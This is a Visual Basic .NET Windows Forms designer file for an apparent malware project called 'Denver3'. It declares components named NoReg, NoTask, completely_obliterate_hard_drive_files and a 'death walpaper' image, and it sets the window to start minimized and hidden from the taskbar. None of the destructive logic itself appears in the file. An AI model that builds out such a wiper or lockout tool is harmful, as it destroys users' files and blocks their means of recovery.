<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.NoReg = New System.Windows.Forms.Timer(Me.components)
        Me.NoTask = New System.Windows.Forms.Timer(Me.components)
        Me.completely_obliterate_hard_drive_files = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker4 = New System.ComponentModel.BackgroundWorker()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.PIC_DEATH_WALPAPER = New System.Windows.Forms.PictureBox()
        CType(Me.PIC_DEATH_WALPAPER, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'NoReg
        '
        '
        'NoTask
        '
        '
        'completely_obliterate_hard_drive_files
        '
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(12, 9)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(126, 13)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "DEV ASSETS WINDOW"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(58, 79)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(80, 13)
        Me.Label2.TabIndex = 2
        Me.Label2.Text = "death walpaper"
        '
        'PIC_DEATH_WALPAPER
        '
        Me.PIC_DEATH_WALPAPER.Image = Global.Denver3.My.Resources.Resources._242406
        Me.PIC_DEATH_WALPAPER.Location = New System.Drawing.Point(15, 95)
        Me.PIC_DEATH_WALPAPER.Name = "PIC_DEATH_WALPAPER"
        Me.PIC_DEATH_WALPAPER.Size = New System.Drawing.Size(163, 123)
        Me.PIC_DEATH_WALPAPER.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PIC_DEATH_WALPAPER.TabIndex = 1
        Me.PIC_DEATH_WALPAPER.TabStop = False
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(525, 241)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.PIC_DEATH_WALPAPER)
        Me.Controls.Add(Me.Label1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.ShowInTaskbar = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Denver3"
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        CType(Me.PIC_DEATH_WALPAPER, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
    Friend WithEvents NoReg As Timer
    Friend WithEvents NoTask As Timer
    Friend WithEvents completely_obliterate_hard_drive_files As System.ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker4 As System.ComponentModel.BackgroundWorker
    Friend WithEvents Label1 As Label
    Friend WithEvents PIC_DEATH_WALPAPER As PictureBox
    Friend WithEvents Label2 As Label
End Class
